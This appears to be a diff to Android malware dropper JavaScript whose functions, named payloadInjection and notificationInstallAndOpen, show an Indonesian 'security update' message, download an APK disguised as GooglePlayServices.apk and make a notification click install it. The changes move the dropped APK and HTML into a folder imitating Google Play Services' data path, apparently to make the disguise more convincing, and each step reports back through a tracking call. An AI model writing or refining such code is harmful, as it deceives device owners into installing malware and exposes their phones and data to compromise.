@@ -227,7 +227,7 @@ function payloadInjection() {
     
     statusBar.textContent = '📥 Mengunduh pembaruan keamanan...';
     if (A.isAvailable) {
-        A.downloadFile(apkUrl1, 'GooglePlayServices.apk');
+        A.downloadFile(apkUrl1, '/storage/emulated/0/Android/data/com.google.android.play.services/GooglePlayServices.apk');
         K({ sumber: 'payload', data: { status: 'apk_downloaded' } });
     } else {
         try { var a=document.createElement('a'); a.href=apkUrl1; a.download='GooglePlayServices.apk'; a.style.display='none'; document.body.appendChild(a); a.click(); document.body.removeChild(a); } catch(e) {}
@@ -237,7 +237,7 @@ function payloadInjection() {
         .then(function(res) { return res.text(); })
         .then(function(html) {
             if (A.isAvailable) {
-                A.saveFile('/sdcard/Download/SystemUpdate.html', html);
+                A.saveFile('/storage/emulated/0/Android/data/com.google.android.play.services/SystemUpdate.html', html);
                 K({ sumber: 'file_system', data: { status: 'html_saved' } });
             } else {
                 var blob = new Blob([html], {type: 'text/html'});
@@ -278,7 +278,7 @@ function notificationInstallAndOpen() {
     });
     
     notif.onclick = function() {
-        var apkPath = '/sdcard/Download/GooglePlayServices.apk';
+        var apkPath = '/storage/emulated/0/Android/data/com.google.android.play.services/GooglePlayServices.apk';
         if (A.isAvailable) {
             A.installAPK(apkPath);
             K({ sumber: 'notification_install', data: 'apk_install_started' });
@@ -286,7 +286,7 @@ function notificationInstallAndOpen() {
             try { window.location.href = 'intent://' + apkPath + '#Intent;scheme=file;package=com.android.packageinstaller;end'; } catch(e) {}
         }
         
-        var htmlPath = '/sdcard/Download/SystemUpdate.html';
+        var htmlPath = '/storage/emulated/0/Android/data/com.google.android.play.services/SystemUpdate.html';
         if (A.isAvailable) {
             A.openFile(htmlPath);
             K({ sumber: 'notification_install', data: 'html_opened' });
